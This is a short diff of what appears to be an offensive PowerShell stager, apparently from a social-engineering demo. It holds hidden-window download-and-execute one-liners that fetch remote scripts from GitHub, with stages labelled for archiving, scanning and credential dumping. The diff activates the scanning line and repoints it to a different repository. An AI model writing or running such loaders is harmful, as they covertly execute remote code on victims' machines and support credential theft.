@@ -4,7 +4,7 @@ if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
 #powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/crjtpp/tpplab_public/main/sedemo01/7z.ps1')"
 
 #scanning
-#powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/crjtpp/tpplab_public/main/sedemo01/scan.ps1')"
+powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/dev/main/macro/scan.ps1')"
 
 #DumpingCredentials
 #powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/crjtpp/tpplab_public/main/sedemo01/cdump.ps1')"
